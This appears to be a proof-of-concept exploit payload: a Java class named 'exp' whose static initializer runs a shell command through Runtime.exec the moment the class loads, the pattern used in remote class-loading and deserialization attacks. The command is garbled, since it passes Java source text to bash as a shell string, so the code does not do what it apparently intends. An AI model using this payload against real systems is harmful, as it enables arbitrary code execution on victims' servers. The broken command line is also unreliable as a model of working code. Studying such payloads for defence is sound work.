public class exp {
static {
    try {
            String[] cmd = {"bash", "-c", "Runtime.getRuntime().exec(\"calc\");"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        } catch ( Exception e ) {
            e.printStackTrace();
        }
    }
}